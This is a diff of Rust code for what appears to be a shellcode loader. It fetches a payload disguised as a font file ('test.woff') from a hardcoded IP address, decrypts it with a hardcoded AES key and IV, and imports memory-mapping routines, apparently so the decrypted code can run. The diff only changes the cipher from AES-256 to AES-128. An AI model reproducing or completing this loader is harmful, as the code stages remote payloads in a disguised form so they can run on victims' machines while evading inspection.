@@ -19,18 +19,18 @@ use winapi::um::winbase;
 use mmap::{MapOption, MemoryMap};
 
 type DWORD = u32;
-type Aes256CbcDec = cbc::Decryptor<aes::Aes256>;
+type Aes256CbcDec = cbc::Decryptor<aes::Aes128>;
 
 #[cfg(target_os = "windows")]
 const URL: &str = "http://192.168.78.129:8080/test.woff";
 #[cfg(target_os = "macos>")]
 const URL: &str = "http://192.168.78.129:8181/test.woff";
 
-const AESKEY: &str = "D(G+KbPeShVmYq3t6v9y$B&E)H@McQfT";
+const AESKEY: &str = "D(G+KbPeShVmYq3t";
 const AESIV: &str  = "8y/B?E(G+KbPeShV";
 
 fn decrypt(data: &[u8], size: usize) -> Vec<u8> {
-    let mut key = [0x42; 32];
+    let mut key = [0x42; 16];
     let mut iv = [0x24; 16];
     for (i, b) in AESKEY.as_bytes().iter().enumerate() {
         key[i] = *b;
